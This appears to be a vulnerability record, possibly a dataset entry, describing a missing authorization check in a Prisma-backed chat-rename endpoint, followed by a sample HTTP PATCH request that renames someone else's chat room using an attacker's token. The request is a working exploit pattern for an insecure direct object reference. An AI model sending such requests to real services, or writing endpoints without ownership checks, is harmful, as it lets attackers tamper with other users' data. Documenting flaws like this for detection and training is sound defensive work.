diagnosis: A Prisma update operation renames a chat room based on chatId provided in the body. It does not check if the user has admin/owner rights to this specific chat room.
exploit_request:
PATCH /api/chat/rename HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"chatId": 500, "newName": "Hacked Chat"}
